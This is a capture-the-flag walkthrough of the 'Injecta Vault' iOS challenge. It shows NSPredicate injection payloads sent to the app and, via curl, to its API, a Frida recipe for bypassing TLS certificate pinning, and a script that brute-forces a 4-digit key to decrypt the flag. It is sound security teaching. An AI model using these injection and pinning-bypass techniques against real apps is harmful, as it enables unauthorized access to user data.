---
title: "Mobile Hacking Lab — Injecta Vault (Mobile) Walkthrough"
tags: [iOS]
---
# Injecta Vault (MHC-CTF) - CTF Walkthrough & Methodology

Target: `Vault.ipa` (Mobile Hacking Lab, bundle id `com.mobilehackinglab.Vault`),
Swift UIKit app, debug-dylib build ("Injecta Vault"), iOS 27 VM (vphone, `iPhone17,3`).

**Flag: `MHC{Pr3d1c4t3_1nj3ct10n_M4st3r}`**

---

## Phase 0 - Know your artifact

Before reading a single string, classify the target:

```sh
unzip -l Vault.ipa                        # IPA = zip: Payload/Vault.app/
file Vault.app/Vault                      # Mach-O 64-bit arm64 executable
otool -l Vault.app/Vault | grep cryptid   # cryptid 0 = NOT FairPlay-encrypted
```

Findings: the main `Vault` executable is a tiny stub (91 KB) with a
`__debug_dylib` section - the real code lives in **`Vault.debug.dylib`**
(336 KB). Not App Store encrypted, so static analysis will be truthful.

Tools used throughout: `unzip`, `file`, `otool`, `nm`, `strings`,
`ipsw class-dump` / `ipsw swift-dump` (blacktop), `frida` + frida-gadget,
`curl`, `openssl`, Python `cryptography`.

## Phase 1 - Strings first, decompilers second

```sh
strings -a Vault.debug.dylib
```

This one command leaked the challenge design:

| String | Why it matters |
|---|---|
| `' AND password == '` and `username == '` | Query template with **quote-spliced input**, the same injection smell as SQL string concatenation |
| `[DEBUG] Predicate String:` / `[DEBUG] Local Evaluation Result:` | Dev debug logging shipped in the binary, narrates the auth logic for you |
| `https://2026.mhc-ctf.workers.dev/injecta-vault/fetch` | An API endpoint, attack surface that exists without the app |
| `H0n2vmL8...=`, `iFvwVyJS...=` (32 raw bytes each) | Key-material smell (turned out to be cert-pin hashes) |
| `...password hint is: last 4 digits of my phone number.` | Intentional breadcrumb: the secret is **4 digits**, a brute-forceable space |
| `is_admin`, `PASSWORD INCORRECT`, `VAULT DATA: ` | Privilege boundary and where the flag surfaces |

Then map structure from names (`nm -gU`, `ipsw swift-dump`):

```
0000000000008a5c T _$s5Vault4UserC7prepare4withS2S_tF          # User.prepare(with:) -> String
0000000000006334 T _$s5Vault6CryptoC07processA4Data...SS_SStFZ # Crypto.processVaultData(base64Payload:key:) -> String?
0000000000005f5c T _$s5Vault6CryptoC19generateSecurityKey...   # Crypto.generateSecurityKey(token:) -> SymmetricKey
```

Swift mangled names decode to full signatures - you can reconstruct the
design doc from names alone before reading any code.

## Phase 2 - The vulnerability: NSPredicate injection

The app builds `username == '<INPUT>' AND password == '<INPUT>'` and
evaluates it as an **NSPredicate** (Apple's query language). Input is
spliced in unescaped, so you break out of the quotes and inject your own
logic - the iOS-flavored cousin of SQL injection.

Proven payloads (each taught something different):

```text
x' OR 1 == 1 OR username == 'x                           # passes the app's LOCAL check
x' OR username == 'admin' OR username == 'x              # passes the SERVER's check
x' OR 1 == 1 OR username == 'admin' OR username == 'x    # works for both
```

We proved the server-side variant with plain curl once we knew the JSON
format from the traffic hook:

```sh
cat > body.json <<'EOF'
{"username":"x' OR username == 'admin' OR username == 'x","password":"x"}
EOF
curl -X POST https://2026.mhc-ctf.workers.dev/injecta-vault/fetch \
  -H 'Content-Type: application/json' --data-binary @body.json
# -> {"success":true,"data":{"status":"success","data":"iLZIis99...HDY="}}
```

**Lesson:** if you can talk to the API directly, do it. The app is just
one client of it.

### Why the "admin" payload alone never unlocks the app locally

If you type `x' OR username == 'admin' OR username == 'x` into the app
itself (not curl) with an empty password, the UI just shows
`ACCESS DENIED / INVALID SIGNATURE` and nothing happens. Hooking
`-[NSPredicate evaluateWithObject:]` with frida shows exactly why: the app
wraps your input into

```
username == "x" OR username == "admin" OR (username == "x" AND password == "")
```

and this evaluates to **false**. `NSPredicate` is doing a literal string
comparison, not resolving `admin` as some kind of magic value - the
`username` property's actual contents are your entire payload string, so
`username == "admin"` is comparing `"x' OR username == 'admin' OR
username == 'x"` against the literal text `"admin"`, which is never
equal. Swapping in a tautology instead (`1 == 1`, which is true
regardless of what either field contains) flips the same hook's result to
**true** immediately - confirmed by diffing the two payloads back to back
on the same build. That is why the LOCAL bypass needs `1 == 1` and the
"admin" phrasing only works against the server's separate, more naive
string check in Phase 2's curl request.

## Phase 3 - Dynamic analysis with frida

Three hook layers, outside in (gadget-mode stable injection on this VM,
since direct frida attach crashes apps on iOS 17+):

1. **Network** - traffic interceptor (`NSURLSession dataTaskWithRequest:completionHandler:`)
   revealed the exact request/response JSON.
2. **TLS pinning** - the request died with `Error: cancelled`. The app's
   `URLSession:didReceiveChallenge:` pins cert hashes (the two 32-byte
   constants from Phase 1) that don't match the live server cert. Bypass
   pattern: `Interceptor.replace` the challenge handler with
   `performDefaultHandling`, plus force `SecTrustEvaluateWithError` to
   return true.
3. **App logic** - hooks on `NSPredicate.evaluateWithObject:` and
   `User.prepare` showed which check gates what.

Also used: programmatic `UITextField.setText_` via frida when VM keyboard
automation was flaky. When UI input fights you, set the values in-process
instead.

## Phase 4 - Crypto reversal (from symbol names alone)

No disassembly needed here - the imported symbols are the recipe.
Demangling the `Crypto` symbols:

```
_$s5Vault6CryptoC19generateSecurityKey5token0B3Kit09SymmetricE0VSS_tFZ
   -> static Vault.Crypto.generateSecurityKey(token: Swift.String) -> CryptoKit.SymmetricKey
_$s5Vault6CryptoC07processA4Data13base64Payload3keySSSgSS_SStFZ
   -> static Vault.Crypto.processVaultData(base64Payload: Swift.String, key: Swift.String) -> Swift.String?
```

plus the CryptoKit imports it links against (`SHA256`, `SymmetricKey(data:)`,
`AES.GCM.SealedBox(combined:)`, `AES.GCM.open`). Together that is the full
algorithm:

- `generateSecurityKey(token:)` -> **key = SHA256(token bytes)**, wrapped in
  a `SymmetricKey`
- `processVaultData(base64Payload:key:)` -> **AES-256-GCM** decrypt of a
  *combined* sealed box: `nonce(12) || ciphertext || tag(16)`

### What is "the token"?

`token` is just the **parameter label** in the function's Swift signature
(what the mangled name encodes). It is not a string stored in the binary.
The app derives its value from the password, and the FORGOT PASSWORD
dialog tells you its format: *"last 4 digits of my phone number"* -
**exactly 4 digits**. We never learned the actual digits from the code;
instead the hint defines the search space, so we try every possibility:

> key = SHA256(4-digit string) -> attempt AES-256-GCM decrypt -> keep the
> one that produces a printable flag.

That's only 10,000 candidates, so it's instant. The winning token is
**`7331`** - which is `1337` ("leet") spelled backwards, the "phone
number" the challenge author chose.

### The decode script (annotated)

```python
import base64, hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# The encrypted payload straight from the API response ("data.data").
# 59 bytes total = GCM nonce (12) + ciphertext (31) + GCM tag (16).
tok = base64.b64decode("iLZIis99AY837KV2eOu/Hevt18RVpB8mgbRX8CDiWOXBGznN3In+XtYSfR92ckVxRytL3g11cVHeHDY=")

# Combined-box layout: peel off the 12-byte nonce, leave ciphertext||tag.
nonce, rest = tok[:12], tok[12:]

# The token's format came from the in-app hint (4 digits). Brute-force all
# 10,000 possibilities: key = SHA256(candidate) per generateSecurityKey.
for i in range(10000):
    candidate = f"{i:04d}".encode()                       # b"0000" ... b"9999"
    key = hashlib.sha256(candidate).digest()              # 32-byte AES-256 key

    try:
        # AESGCM.decrypt verifies the GCM tag: a wrong key raises, the
        # right one returns the plaintext. No padding to worry about.
        plaintext = AESGCM(key).decrypt(nonce, rest, None)
        print(f"token = {candidate.decode()}\nflag  = {plaintext}")
        break
    except Exception:
        continue                                          # wrong key -> try next

# token = 7331
# flag  = b'MHC{Pr3d1c4t3_1nj3ct10n_M4st3r}'
```

Why this works: AES-GCM authenticates with its tag, so a wrong key
*always* throws instead of producing garbage. That gives an unambiguous
oracle for brute force.

### Same decode in CyberChef (no code)

**Recipe 1 - get the key hash** (one operation only):

| # | Operation | Settings |
|---|-----------|----------|
| 1 | `SHA2` | Size: **256** (Rounds stays 64, the standard SHA-256 internal round count, not an iteration count) |

Input: `7331` -> output (already hex): `f789909693b3898605450349b35d0218bc556c51f960f944e50ae242dc3446a3`

Ready-made link: <https://cyberchef.org/#recipe=SHA2('256',64,160)&input=NzMzMQ>

Do not add a `To Hex` step. CyberChef's `SHA2` outputs the hex digest
directly; `To Hex` on top of it double-encodes the hex string's ASCII
characters (you would get 128 characters of `39363933...` noise instead
of the `f789...` digest). Recipe 1 also must not contain `Drop bytes` -
that belongs to Recipe 2 below. These are two separate recipe runs.

Shortcut: you can skip Recipe 1 entirely, since the key hash above is
already known. It only matters when brute-forcing other candidate tokens.

**Recipe 2 - decrypt the vault token** (separate recipe, new input).

CyberChef's `AES Decrypt` operation reads the GCM tag from its own
**GCM Tag** field, not from the tail of the input, so the input fed to it
must be the ciphertext only, and the **Input** dropdown must be **Raw**
(we just decoded Base64, so the stream is already raw bytes). Getting
either of those wrong produces "Authentication tag does not match tag
length".

| # | Operation | Settings |
|---|-----------|----------|
| 1 | `From Base64` | (no options) |
| 2 | `Drop bytes` | Start: `0`, Length: `12` (removes the leading GCM nonce) |
| 3 | `Drop bytes` | Start: `31`, Length: `16` (removes the trailing GCM tag - note the array re-indexes after step 2, so this is relative to the 47-byte remainder, not the original 59 bytes) |
| 4 | `AES Decrypt` | Mode: **GCM**, Key: `f789909693b3898605450349b35d0218bc556c51f960f944e50ae242dc3446a3` (Key format: **Hex**), IV: `88b6488acf7d018f37eca576` (IV format: **Hex**), Input: **Raw**, Output: **Raw**, GCM Tag: `1f76724571472b4bde0d757151de1c36` (Hex) |

*Shorter equivalent* - `AES Decrypt` can pull the IV from the input
itself (`IV from input: From start`, `IV Length: 12`), so you only need
to strip the tag first:

| # | Operation | Settings |
|---|-----------|----------|
| 1 | `From Base64` | (no options) |
| 2 | `Drop bytes` | Start: `43`, Length: `16` (removes the trailing GCM tag from the original 59-byte blob) |
| 3 | `AES Decrypt` | Mode: **GCM**, Key: `f789909693b3898605450349b35d0218bc556c51f960f944e50ae242dc3446a3` (Hex), Input: **Raw**, IV Length: **12**, IV from input: **From start**, GCM Tag: `1f76724571472b4bde0d757151de1c36` (Hex) |

Input (either recipe): `iLZIis99AY837KV2eOu/Hevt18RVpB8mgbRX8CDiWOXBGznN3In+XtYSfR92ckVxRytL3g11cVHeHDY=`

Output: `MHC{Pr3d1c4t3_1nj3ct10n_M4st3r}`

#### Where every constant comes from

None of the Key/IV/Tag values above are guessed or derived through math.
They are literal byte ranges inside the same base64 blob, obtained by
base64-decoding it and reading the bytes as hex:

```sh
echo "iLZIis99AY837KV2eOu/Hevt18RVpB8mgbRX8CDiWOXBGznN3In+XtYSfR92ckVxRytL3g11cVHeHDY=" | base64 -d | xxd
```

or in CyberChef: input = the base64 string, recipe = `From Base64` ->
`To Hex`
(<https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)To_Hex('None',0)&input=aUxaSWlzOTlBWTgzN0tWMmVPdS9IZXZ0MThSVnBCOG1nYlJYOENEaVdPWEJHem5OM0luK1h0WVNmUjkyY2tWeFJ5dEwzZzExY1ZIZUhEWT0>).

That produces the full 59-byte hex dump:

```
88b6488acf7d018f37eca57678ebbf1debedd7c455a41f2681b457f020e258e5c11b39cddc89fe5ed6127d1f76724571472b4bde0d757151de1c36
└────────┬───────┘└──────────────────┬─────────────────────────┘└──────────────┬──────────────┘
   nonce / IV (12 B)              ciphertext (31 B)                        GCM tag (16 B)
```

AES-GCM's "combined" format (CryptoKit's `SealedBox.combined`) stores the
nonce in front of the ciphertext, since it is public data that ships with
the message rather than a separate secret. The key encryption scheme
decision to make is simply: which slice of that 59-byte string goes where.

| Bytes | Role | Value | Pull it out with |
|-------|------|-------|-------------------|
| 0-11 | nonce / IV | `88b6488acf7d018f37eca576` | `Take bytes (0, 12)` or `head -c 12` |
| 12-42 | ciphertext | `78ebbf1debedd7c455a41f2681b457f020e258e5c11b39cddc89fe5ed6127d` | `Take bytes (12, 31)` |
| 43-58 | GCM tag | `1f76724571472b4bde0d757151de1c36` | `Take bytes (43, 16)` or `tail -c 16` |

Each `Take bytes` is normally followed by its own `To Hex` step in
CyberChef (or `xxd -p` in the shell) to turn the raw bytes into the hex
string the Key/IV/Tag fields expect. For example, the IV alone:
`From Base64` -> `Take bytes (0, 12)` -> `To Hex`
(<https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Take_bytes(0,12,false)To_Hex('None',0)&input=aUxaSWlzOTlBWTgzN0tWMmVPdS9IZXZ0MThSVnBCOG1nYlJYOENEaVdPWEJHem5OM0luK1h0WVNmUjkyY2tWeFJ5dEwzZzExY1ZIZUhEWT0>),
and the tag the same way with `Take bytes (43, 16)`.

`To Hex` is only for *looking* at bytes, never for feeding them forward
into `AES Decrypt`. That operation needs **Raw** bytes as its input, which
is exactly why Recipe 2 uses `Drop bytes` to shave off the nonce and tag
rather than converting anything to hex text along the way.

A final difference worth flagging: Python's `AESGCM.decrypt` expects
`ciphertext || tag` glued together in one argument (that is why `rest` is
passed as a single piece in the script above), while CyberChef's
`AES Decrypt` wants the tag supplied separately in its **GCM Tag** field
and only the bare ciphertext as input. Same algorithm, two different
calling conventions - that split is the main source of confusion when
moving between the two.

---

## The methodology - a funnel from cheap to expensive

1. **Classify the artifact** (`file`, `otool -l`, cryptid). Prevents hours
   of confusion later.
2. **Read what the developer left behind** (`strings`). URLs, query
   templates, `[DEBUG]` logs, hints, key material.
3. **Map structure from names** (`nm`, `ipsw swift-dump`). Find the
   security boundaries: auth, network, crypto, privilege checks.
4. **Observe the truth dynamically** (frida). Static analysis says what
   code *can* do; runtime says what it *does*. Errors are information.
5. **Exploit the boundary** and **answer only the question you have**.
   We never fully decompiled anything - symbol names plus a 10,000-entry
   brute force closed it out.

What stood out most: `' AND password == '` (injection smell), `[DEBUG]`
strings (the developer narrating their own logic), 32-byte blobs (key
material), and a hint that reveals the secret's *format* rather than its
value (turning it into a search space). Those four patterns recur in
real-world mobile assessments constantly.
